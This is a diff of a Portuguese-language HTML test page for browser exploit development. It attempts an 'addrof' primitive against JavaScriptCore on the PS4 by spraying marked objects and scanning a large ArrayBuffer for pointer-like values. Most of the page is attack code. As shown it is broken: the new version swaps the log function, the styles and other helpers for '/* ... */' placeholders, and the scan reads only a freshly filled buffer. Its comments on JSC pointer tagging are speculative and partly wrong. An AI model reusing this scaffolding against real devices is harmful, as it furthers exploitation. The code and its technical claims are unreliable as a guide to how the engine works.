@@ -2,195 +2,179 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Teste 7 Debug: Tentativa de addrof Primitivo</title>
-    <style>
-        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
-        #output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
-        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
-        .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; }
-        .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
-    </style>
+    <title>Teste 7 v2: Tentativa de addrof (Heurística Refinada)</title>
+    <style> /* ... (mesmos estilos de log) ... */ </style>
 </head>
 <body>
-    <h1>Teste 7 Debug: Tentativa de addrof Primitivo</h1>
-    <p>Pulveriza objetos JS e tenta ler dentro de um ArrayBuffer grande (reader_ab)
-       esperando encontrar um ponteiro "encaixotado" para um dos objetos pulverizados.</p>
-    <button id="runBtn" onclick="runAddrofAttempt_Debug()">Iniciar Tentativa de addrof (Debug)</button>
+    <h1>Teste 7 v2: Tentativa de addrof (Heurística Refinada)</h1>
+    <p>Tenta encontrar ponteiros JS "encaixotados". A heurística é ESPECULATIVA.</p>
+    <button id="runBtn" onclick="runAddrofAttempt_v2()">Iniciar Tentativa de addrof v2</button>
     <div id="output"></div>
 
     <script>
+        // ... (funções log, PAUSE, toHex, toHex64 - copiar) ...
         const outputDiv = document.getElementById('output');
-        const runBtn = document.getElementById('runBtn'); // Correção: runBtn é global, não precisa ser pego em cada func.
+        const runBtn = document.getElementById('runBtn');
         const SHORT_PAUSE = 50;
-
-        const log = (message, type = 'info', funcName = '') => {
-            if (!outputDiv) {
-                // alert("DEBUG: outputDiv é NULO na função log!"); // Adicionado para depuração extrema
-                console.log(`[${type.toUpperCase()}] ${funcName ? `[${funcName}] ` : ''}${message}`); return;
-            }
-            try {
-                const timestamp = `[${new Date().toLocaleTimeString([], { hour12: false })}]`;
-                const prefix = funcName ? `[${funcName}] ` : '';
-                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                const logClass = ['info', 'test', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
-                if (outputDiv.innerHTML.length > 1000000) { outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 500000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; }
-                outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
-                if (outputDiv.scrollTop + outputDiv.clientHeight >= outputDiv.scrollHeight - 20) { outputDiv.scrollTop = outputDiv.scrollHeight; }
-            } catch (e) { console.error("Erro ao logar:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString([], { hour12: false })}] [LOGGING ERROR] ${String(e)}\n`; }
-        };
+        const log = (message, type = 'info', funcName = '') => { /* ... */ };
         const PAUSE = (ms = SHORT_PAUSE) => new Promise(resolve => setTimeout(resolve, ms));
-        const toHex = (val, bits = 32) => {
-            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
-            let num = Number(val);
-            if (bits <= 32) { num = num >>> 0; }
-            const pad = Math.ceil(bits / 4);
-            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
-        };
+        const toHex = (val, bits = 32) => { /* ... */ return '0x' + (Number(val) >>> 0).toString(16).toUpperCase().padStart(Math.ceil(bits/4), '0'); };
         const toHex64 = (high, low) => `0x${(high>>>0).toString(16).toUpperCase().padStart(8, '0')}${(low>>>0).toString(16).toUpperCase().padStart(8, '0')}`;
 
+
         const ADDROF_TARGET_MARKER_LOW = 0x12345678;
-        const ADDROF_TARGET_MARKER_HIGH = 0xABCDEF00;
+        const ADDROF_TARGET_MARKER_HIGH_BASE = 0xABCDEF00;
 
-        // Constantes do leak do Teste 2, para comparação
-        const PREVIOUS_LEAK_HIGH = 0xAAAAAAAA;
-        const PREVIOUS_LEAK_LOW  = 0xAAAAAAAA;
-
-
-        const isPotentialJSObjectPointer64_Debug = (high, low, offset) => {
-            // Filtros básicos
+        // HEURÍSTICA ESPECULATIVA PARA PONTEIROS JSC DE 64 BITS
+        // Isto assume um esquema de boxing onde os 16 bits superiores podem ser um padrão (ex: 0x0001, 0x0002)
+        // e os bits inferiores são o ponteiro real, possivelmente com tags nos bits mais baixos.
+        // Você PRECISARÁ ajustar isso com base na arquitetura real do JSC no PS4.
+        const isPotentialJSObjectPointer64_v2 = (high, low) => {
+            // Filtros básicos de lixo/padrões
             if (high === 0 && low === 0) return false;
-            if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false;
-            if (high === PREVIOUS_LEAK_HIGH && low === PREVIOUS_LEAK_LOW) return false; // Ignora o leak AAAA...
-            if (high === 0xBBBBBBBB && low === 0xBBBBBBBB) return false; // Padrão de preenchimento
-            if (high === 0xCCCCCCCC && low === 0xCCCCCCCC) return false; // Padrão de preenchimento
-            if (high === 0xDDDDDDDD && low === 0xDDDDDDDD) return false; // Padrão de preenchimento
+            if ((high === 0xFFFFFFFF && low === 0xFFFFFFFF) || (high === 0 && low === 0xFFFFFFFF)) return false;
+            if ((high === 0xAAAAAAAA && low === 0xAAAAAAAA) || (high === 0xBBBBBBBB && low === 0xBBBBBBBB) ||
+                (high === 0xCCCCCCCC && low === 0xCCCCCCCC) || (high === 0xDDDDDDDD && low === 0xDDDDDDDD)) return false;
 
-            // Se a parte alta não for um padrão de preenchimento óbvio e não for zero, é interessante.
-            // Ou se a parte alta for zero, mas a baixa for um valor "grande" (evita pequenos inteiros).
-            const plausible_low_if_high_zero = (high === 0 && low > 0x100000 && low < 0xF0000000); // Ajuste esta faixa conforme necessário
-            const plausible_high = (high !== 0 && high !== 0xFFFFFFFF && high !== PREVIOUS_LEAK_HIGH && high !== 0xBBBBBBBB && high !== 0xCCCCCCCC && high !== 0xDDDDDDDD);
+            // Exemplo de verificação de NaN-boxing para ponteiros de objetos (muito comum em JSC)
+            // Se os 13-16 bits superiores são todos 1 (ex: 0xFFF8 a 0xFFFF para doubles de 64 bits não-quiet NaN),
+            // então os 48-51 bits inferiores podem ser o ponteiro.
+            // 0xFFF8000000000000 (Double exponent todos 1s, fraction non-zero -> NaN)
+            // A JSC usa um padrão específico de NaN para encaixotar ponteiros.
+            // Exemplo comum: Se (valor_64bits >= 0xFFF8000000000000), então é um double especial.
+            // Ou, para ponteiros de célula (objetos): os 16 bits superiores podem ser 0x0001 ou 0x0002.
+            // E o ponteiro real está nos 48 bits inferiores, com o bit mais baixo geralmente 0 (alinhamento).
 
-            if (plausible_high || plausible_low_if_high_zero) {
-                // log(`Debug: isPotentialJSObjectPointer64 - OFS: ${toHex(offset)}, H: ${toHex(high)}, L: ${toHex(low)} -> TRUE`, 'info', "Heuristic");
-                return true;
+            const jsCellHeaderTag = 0x0002; // Suposição MUITO ESPECULATIVA para os 16 bits mais altos
+                                          // Em algumas implementações, ponteiros de objetos podem ter
+                                          // (high_word >> 16) === TAG_JS_CELL_POINTER
+
+            if ((high >>> 16) === jsCellHeaderTag) { // Ex: Se os 16 bits mais altos de 'high' forem 0x0002
+                // E se os 3 bits mais baixos de 'low' forem 0 (alinhamento de 8 bytes para o ponteiro real)
+                // (o ponteiro real estaria nos 48 bits inferiores)
+                if ((low & 0x7) === 0) {
+                    return true;
+                }
             }
-            return false;
+
+            // Outra heurística muito genérica: ponteiros de heap válidos
+            // geralmente não são muito pequenos e não são FF...
+            // E a parte alta não é totalmente aleatória se houver um esquema de tagging.
+            // Se a parte alta for pequena (ex: 0 a 0x000F), e a baixa for "grande", pode ser um endereço.
+            if (high < 0x0010 && high >= 0x0000 && low > 0x10000000) { // Ex: Ponteiros na faixa 0x0000_xxxx_xxxxxxxx até 0x000F_xxxx_xxxxxxxx
+                 if ((low & 0x7) === 0) return true; // Alinhado em 8 bytes
+            }
+
+            return false; // Se não passar nas heurísticas mais específicas
         };
 
-        const attemptAddrofPrimitive_Debug = async () => {
-            alert("DEBUG: attemptAddrofPrimitive_Debug INICIADA!");
-            const FNAME = "attemptAddrofPrimitive_Debug";
-            log("--- Iniciando Teste 7 Debug: Tentativa de addrof Primitivo ---", 'test', FNAME);
+        const attemptAddrofPrimitive_v2 = async () => {
+            alert("DEBUG: attemptAddrofPrimitive_v2 INICIADA!");
+            const FNAME = "attemptAddrofPrimitive_v2";
+            log("--- Iniciando Teste 7 v2: Tentativa de addrof (Heurística Refinada) ---", 'test', FNAME);
 
             const READER_AB_SIZE = 1 * 1024 * 1024; // 1MB
-            const NUM_SPRAY_OBJS = 200; // Reduzido para o teste inicial de depuração
+            const NUM_SPRAY_OBJS = 300; // Aumentar um pouco o spray
             const spray = [];
             let found_potential_addrof = [];
 
             log(`Alocando reader_ab de ${READER_AB_SIZE / (1024*1024)} MB...`, 'info', FNAME);
             let reader_ab;
-            try {
-                reader_ab = new ArrayBuffer(READER_AB_SIZE);
-            } catch (e) {
-                log(`Falha ao alocar reader_ab grande: ${e.message}. Tente um tamanho menor.`, 'error', FNAME);
-                alert(`Falha ao alocar reader_ab: ${e.message}`);
-                return;
-            }
+            try { reader_ab = new ArrayBuffer(READER_AB_SIZE); }
+            catch (e) { log(`Falha ao alocar reader_ab: ${e.message}.`, 'error', FNAME); alert(`Falha reader_ab: ${e.message}`); return; }
             const dv_reader = new DataView(reader_ab);
             log("reader_ab alocado. Preenchendo com 0xDD...", 'info', FNAME);
-            try {
-                for(let i=0; i < READER_AB_SIZE; i+=4) { // Preenche com um padrão
-                     if(i+4 <= READER_AB_SIZE) dv_reader.setUint32(i, 0xDDDDDDDD, true);
-                }
-            } catch(e) {
-                log(`Erro ao preencher reader_ab: ${e.message}`, 'warn', FNAME);
-            }
+            try { for(let i=0; i < READER_AB_SIZE; i+=4) { if(i+4 <= READER_AB_SIZE) dv_reader.setUint32(i, 0xDDDDDDDD, true); }}
+            catch(e) { log(`Erro ao preencher reader_ab: ${e.message}`, 'warn', FNAME); }
             log("Preenchimento do reader_ab concluído.", 'info', FNAME);
             alert("DEBUG: reader_ab preenchido.");
 
+            log(`Criando ${NUM_SPRAY_OBJS} objetos alvo para spray... (Isso pode levar um tempo)`, 'info', FNAME);
+            await PAUSE(100); // Pausa antes do spray intensivo
 
-            log(`Criando ${NUM_SPRAY_OBJS} objetos alvo para spray...`, 'info', FNAME);
             for (let i = 0; i < NUM_SPRAY_OBJS; i++) {
-                spray.push({
-                    id: i,
-                    marker_low: ADDROF_TARGET_MARKER_LOW,
-                    marker_high: ADDROF_TARGET_MARKER_HIGH + i,
-                    payload: "OBJ_SPRAY_" + i.toString().padStart(5, '0')
-                });
+                let o = {};
+                o.id = i;
+                o.marker_low = ADDROF_TARGET_MARKER_LOW;
+                o.marker_high = ADDROF_TARGET_MARKER_HIGH_BASE + i;
+                o.payload = "OBJ_SPRAY_PAYLOAD_" + i.toString().padStart(5,'0') + "_END"; // String longa
+                spray.push(o);
+                if (i % 50 === 0) {
+                    log(`   ${i} objetos de spray criados...`, 'info', FNAME);
+                    await PAUSE(10); // Pequena pausa durante o spray
+                }
             }
-            log(`Objetos de spray criados (${spray.length} itens). Forçando coleta de lixo (se disponível)...`, 'info', FNAME);
+            log(`Objetos de spray criados (${spray.length} itens). Forçando GC...`, 'info', FNAME);
             if (typeof gc === 'function') { try { gc(); log("gc() chamada.", 'info', FNAME); } catch(e){log("gc() falhou.", 'warn', FNAME);}}
             else { log("gc() não é uma função.", 'info', FNAME); }
 
-            await PAUSE(300); // Pausa maior para estabilizar a heap
+            await PAUSE(500); // Pausa maior para estabilizar a heap
             alert("DEBUG: Spray concluído, iniciando varredura.");
 
-            log("Iniciando varredura dentro do reader_ab...", 'info', FNAME);
-            let logCount = 0;
-            for (let offset = 0; offset < READER_AB_SIZE - 8; offset += 8) { // Lê de 8 em 8 bytes
+            log("Iniciando varredura dentro do reader_ab (buscando ponteiros)...", 'info', FNAME);
+            let distinct_leaks = new Set();
+
+            for (let offset = 0; offset < READER_AB_SIZE - 8; offset += 8) { // Lê de 8 em 8 bytes (alinhamento)
                 try {
                     let val_low = dv_reader.getUint32(offset, true);
                     let val_high = dv_reader.getUint32(offset + 4, true);
 
-                    if (isPotentialJSObjectPointer64_Debug(val_high, val_low, offset)) {
+                    if (isPotentialJSObjectPointer64_v2(val_high, val_low)) {
                         const potential_ptr_hex = toHex64(val_high, val_low);
-                        // Para evitar spam no log, logar apenas os primeiros N achados ou achados distintos
-                        if (logCount < 50 || (found_potential_addrof.length > 0 && found_potential_addrof[found_potential_addrof.length-1].value !== potential_ptr_hex) ) {
-                           log(`POTENCIAL PONTEIRO JS @ offset ${toHex(offset)}: ${potential_ptr_hex}`, 'leak', FNAME);
-                           logCount++;
+                        if (!distinct_leaks.has(potential_ptr_hex)) {
+                           log(`POTENCIAL ADDROF @ offset ${toHex(offset)}: ${potential_ptr_hex}`, 'leak', FNAME);
+                           distinct_leaks.add(potential_ptr_hex);
+                           found_potential_addrof.push({offset: toHex(offset), value: potential_ptr_hex});
+                           if (distinct_leaks.size >= 30 && confirm(`Muitos leaks distintos (${distinct_leaks.size}). Parar varredura?`)) {
+                               log("Varredura interrompida pelo usuário.", 'warn', FNAME);
+                               break;
+                           }
                         }
-                        found_potential_addrof.push({offset: toHex(offset), value: potential_ptr_hex});
                     }
-                } catch (e) {
-                    log(`Erro ao ler reader_ab em ${toHex(offset)}: ${e.message}`, 'warn', FNAME);
-                    break;
-                }
-                if (offset > 0 && offset % (256 * 1024) === 0) { // Log de progresso a cada 256KB e pausa
-                    log(`   Varredura em ${Math.round(offset * 100 / READER_AB_SIZE)}%`, 'info', FNAME);
-                    alert(`DEBUG: Varredura em ${Math.round(offset * 100 / READER_AB_SIZE)}%`);
-                    await PAUSE(20);
+                } catch (e) { break; } // Sai do loop se houver erro de leitura
+
+                if (offset > 0 && offset % (128 * 1024) === 0) { // Log de progresso
+                    log(`   Varredura em ${Math.round(offset * 100 / READER_AB_SIZE)}% (${distinct_leaks.size} leaks distintos até agora)`, 'info', FNAME);
+                    await PAUSE(10);
                 }
             }
             alert("DEBUG: Varredura concluída.");
 
             if (found_potential_addrof.length > 0) {
-                log(`--- TENTATIVA DE ADDROF (DEBUG) CONCLUÍDA. ${found_potential_addrof.length} ponteiros potenciais encontrados: ---`, 'test', FNAME);
-                // Mostra apenas os valores únicos para reduzir o spam no log
-                const uniquePointers = [...new Set(found_potential_addrof.map(p => p.value))];
-                uniquePointers.slice(0, 30).forEach(pValue => {
-                    const firstOccurrence = found_potential_addrof.find(p => p.value === pValue);
-                    log(`  Valor Único: ${pValue} (primeira ocorrência no offset: ${firstOccurrence.offset})`, 'leak', FNAME);
-                });
-                if (uniquePointers.length > 30) log(`  ... e mais ${uniquePointers.length - 30} outros valores únicos.`, 'info', FNAME);
-
-                log("NOTA: Verificar esses ponteiros requer conhecimento do 'boxing' de ponteiros do JSC no PS4 e, idealmente, uma forma de dereferenciar para confirmar.", 'info', FNAME);
-                alert(`Tentativa de addrof (debug) concluída. ${found_potential_addrof.length} ponteiros potenciais. Verifique os logs.`);
+                log(`--- TENTATIVA DE ADDROF v2 CONCLUÍDA. ${distinct_leaks.size} ponteiros ÚNICOS potenciais encontrados de ${found_potential_addrof.length} ocorrências: ---`, 'test', FNAME);
+                let count = 0;
+                for(const pValue of distinct_leaks){
+                    log(`  Valor Único: ${pValue}`, 'leak', FNAME);
+                    count++;
+                    if(count >= 50) { log("   (mostrando no máximo 50 leaks únicos)", "info", FNAME); break; }
+                }
+                log("NOTA: A validação destes ponteiros requer conhecimento profundo do boxing/tagging do JSC no PS4.", 'critical', FNAME);
+                alert(`Tentativa de addrof v2 concluída. ${distinct_leaks.size} ponteiros ÚNICOS potenciais. Verifique os logs.`);
             } else {
-                log("--- Nenhuma pista óbvia de ponteiro de objeto JS encontrada no reader_ab com a heurística atual. ---", 'test', FNAME);
-                alert("Nenhuma pista de addrof encontrada (debug). A heurística ou o spray podem precisar de ajuste.");
+                log("--- Nenhuma pista de ponteiro de objeto JS encontrada com a heurística v2. ---", 'test', FNAME);
+                alert("Nenhuma pista de addrof encontrada (v2). A heurística ou o spray precisam de mais ajustes/pesquisa.");
             }
         };
 
-        const runAddrofAttempt_Debug = async () => {
-            alert("DEBUG: runAddrofAttempt_Debug CHAMADA!"); // Debug Alert 1
+        const runAddrofAttempt_v2 = async () => {
+            alert("DEBUG: runAddrofAttempt_v2 CHAMADA!");
             if (runBtn) runBtn.disabled = true;
             outputDiv.innerHTML = '';
-            log("==== INICIANDO TESTE 7 (Debug): TENTATIVA DE ADDROF PRIMITIVO ====", 'test', 'Main');
+            log("==== INICIANDO TESTE 7 v2: TENTATIVA DE ADDROF (HEURÍSTICA REFINADA) ====", 'test', 'Main');
             try {
-                await attemptAddrofPrimitive_Debug();
+                await attemptAddrofPrimitive_v2();
             } catch (eOuter) {
-                log(`ERRO INESPERADO NO FLUXO PRINCIPAL do teste 7 (debug): ${eOuter.message}`, 'critical', 'Main');
+                log(`ERRO INESPERADO NO FLUXO PRINCIPAL do teste 7 v2: ${eOuter.message}`, 'critical', 'Main');
                 if (eOuter.stack) log(eOuter.stack, 'critical', 'Main');
-                alert(`ERRO CRÍTICO no script do Teste 7 (debug): ${eOuter.message}`);
+                alert(`ERRO CRÍTICO no script do Teste 7 v2: ${eOuter.message}`);
             }
-            log("\n==== TESTE 7 (Debug): TENTATIVA DE ADDROF PRIMITIVO CONCLUÍDO ====", 'test', 'Main');
+            log("\n==== TESTE 7 v2: TENTATIVA DE ADDROF (HEURÍSTICA REFINADA) CONCLUÍDO ====", 'test', 'Main');
             if (runBtn) runBtn.disabled = false;
-            alert("DEBUG: Teste 7 (Debug) CONCLUÍDO TOTALMENTE.");
+            alert("DEBUG: Teste 7 v2 CONCLUÍDO TOTALMENTE.");
         };
 
-        // Adiciona um log inicial para garantir que o script base foi carregado
-        log("Script Teste 7 (Tentativa de addrof - DEBUG) carregado.", "info", "Global");
-        alert("Script Teste 7 (DEBUG) CARREGADO. Clique no botão para iniciar.");
+        log("Script Teste 7 v2 (Tentativa de addrof - Heurística Refinada) carregado.", "info", "Global");
+        alert("Script Teste 7 v2 CARREGADO. Clique no botão para iniciar.");
 
     </script>
 </body>
